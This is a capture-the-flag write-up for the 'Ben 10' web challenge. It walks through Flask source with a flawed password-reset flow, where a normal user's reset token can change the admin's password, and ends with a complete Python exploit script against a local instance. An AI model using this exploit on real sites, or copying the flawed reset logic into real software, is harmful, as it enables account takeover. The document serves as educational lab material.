+++
title = 'Ben 10'
tags = [
  "Web",
  "Python",
  "Business logic vulnerability",
  "gheddus",
]
date = 2025-03-11T16:52:02+01:00
draft = true
+++



<h1 style='text-decoration: underline;text-decoration-color: #9e8c6c;font-size: 3em;'>Ben 10</h1>

**Description**: Ben Tennyson's Omnitrix holds a mysterious and powerful form called Materia Grigia — a creature that only those with the sharpest minds can access. It's hidden deep within the system, waiting for someone clever enough to unlock it. Only the smartest can access what’s truly hidden.

Can you outsmart the system and reveal the flag?

## Introduction

This is one of the webs of the 2025 italian championship cybercup first round, the ctf was made in january 2025, and I'm writing the writeups only so some information could be wrong or not complete.

The challenge is presented in a very clear and simple way, we have in front of us a login form and one to register, once logged in we see we are shown several photos of the different aliens of ben10.

![screen](/images/ben10/img1.png)

When we try to click on each alien, it just opens another screen with details, until the last one hides information that only the admin can see.

![screen](/images/ben10/img2.png)

From here I would say that a look at the code would not hurt.

## Source

Analysing the code, we see that the admin is created at the same time as the user, so each user has their own randomly generated admin.

```python
    admin_username = f"admin^{username}^{secrets.token_hex(5)}"
    admin_password = secrets.token_hex(8)
```

And as you can see, the admin username is associated with the user created.

```python
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    cursor.execute("INSERT INTO users (username, password, admin_username) VALUES (?, ?, ?)",(username, password, admin_username))
    cursor.execute("INSERT INTO users (username, password, admin_username) VALUES (?, ?, ?)",(admin_username, admin_password, None))
    conn.commit()
```

So the first problem is to understand how to find the name of our admin. But fortunately, it's quite simple, because we see that it's simply inserted into a template, and therefore probably somewhere in the HTML when rendered.

```python
return render_template('home.html', username=username, admin_username=admin_username, image_names=image_names)
```

```html
{% extends "base.html" %}

{% block content %}
    <h1>Welcome, {{ username }}</h1>
    <h2>Do you like the aliens on my Omnitrix?</h2>

    <!-- secret admin username -->
    <div style="display:none;" id="admin_data">{{ admin_username }}</div>

    <div id="image-grid">
        {% for image_name in image_names %}
            <div>
                <img src="{{ url_for('static', filename='images/' + image_name + '.webp') }}" alt="{{ image_name }}"
                    onclick="window.location.href='/image/{{ image_name }}'" style="cursor:pointer;">
            </div>
        {% endfor %}
    </div>

    <a href="{{ url_for('logout') }}" style="margin-top: 20px; display: block;">Logout</a>
{% endblock %}
```

So the first problem is solved...

The second is to find out how to access the secret image, with the aim of logging in as admin. To do this, we go back to analysing the source code.

Among the various endpoints, we find `/reset_password` and `/forgot_password`.

The former allows us to generate a reset token to be used in `/forgot_password` to change the user's password.

```python
@app.route('/reset_password', methods=['GET', 'POST'])
def reset_password():
    """Handle reset password request."""
    if request.method == 'POST':
        username = request.form['username']

        if username.startswith('admin'):
            flash("Admin users cannot request a reset token.", "error")
            return render_template('reset_password.html')

        if not get_user_by_username(username):
            flash("Username not found.", "error")
            return render_template('reset_password.html')

        reset_token = secrets.token_urlsafe(16)
        update_reset_token(username, reset_token)

        flash("Reset token generated!", "success")
        return render_template('reset_password.html', reset_token=reset_token)

    return render_template('reset_password.html')


@app.route('/forgot_password', methods=['GET', 'POST'])
def forgot_password():
    """Handle password reset."""
    if request.method == 'POST':
        username = request.form['username']
        reset_token = request.form['reset_token']
        new_password = request.form['new_password']
        confirm_password = request.form['confirm_password']

        if new_password != confirm_password:
            flash("Passwords do not match.", "error")
            return render_template('forgot_password.html', reset_token=reset_token)

        user = get_user_by_username(username)
        if not user:
            flash("User not found.", "error")
            return render_template('forgot_password.html', reset_token=reset_token)

        if not username.startswith('admin'):
            token = get_reset_token_for_user(username)
            if token and token[0] == reset_token:
                update_password(username, new_password)
                flash(f"Password reset successfully.", "success")
                return redirect(url_for('login'))
            else:
                flash("Invalid reset token for user.", "error")
        else:
            username = username.split('^')[1]
            token = get_reset_token_for_user(username)
            if token and token[0] == reset_token:
                update_password(request.form['username'], new_password)
                flash(f"Password reset successfully.", "success")
                return redirect(url_for('login'))
            else:
                flash("Invalid reset token for user.", "error")

    return render_template('forgot_password.html', reset_token=request.args.get('token'))
```

The problem here is on line 183, where instead of using `username` it uses `request.form['username']`, and this causes a big problem because now you can just use the normal user's token to reset the admin's password.

## Solution

```python
# filename: exploit.py

#!/usr/bin/python3
import random
import string

import requests
from bs4 import BeautifulSoup

BASE_URL = "http://localhost:5000/"

s = requests.Session()

def string_generator(length):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def login(username, password):
    data = {
        "username": username,
        "password": password
    }
    r = s.post(f"{BASE_URL}/login", data=data)
    return r.status_code == 200

def register(username, password):
    data = {
        "username": username,
        "password": password
    }
    r = s.post(f"{BASE_URL}/register", data=data)
    return r.status_code == 200

def get_admin():
    r = s.get(BASE_URL)
    soup = BeautifulSoup(r.text, 'html.parser')
    admin_username = soup.find('div', {'id': 'admin_data'}).text.strip()
    print("[+] Admin Username:", admin_username)
    return admin_username

def get_reset_token(username):
    r = s.post(f"{BASE_URL}/reset_password",data={"username": username})
    soup = BeautifulSoup(r.text, 'html.parser')
    token = soup.find('strong').text.strip()
    return token

def exploit(username_admin,token):
    data = {
        "username": username_admin,
        "reset_token": token,
        "new_password": "cookieforme",
        "confirm_password": "cookieforme"
    }
    r = s.post(f"{BASE_URL}/forgot_password", data=data)
    if r.status_code == 200:
        print("[+] Generated new password!")
    else:
        print("[!] Failed to generate new password")
        return

    if login(username_admin, "cookieforme"):
        print("[+] Logged in as admin!")
    else:
        print("[!] Failed to login as admin")
        return

    return s.get(f"{BASE_URL}/image/ben10").text

def main():
    username = string_generator(10)
    password = string_generator(10)
    register(username, password)
    login(username, password)
    username_admin = get_admin()
    token = get_reset_token(username)
    print(exploit(username_admin,token))


if __name__ == "__main__":
	main()


# goodluck by @akiidjk
```

<p align='right'>Author: akiidjk </p>
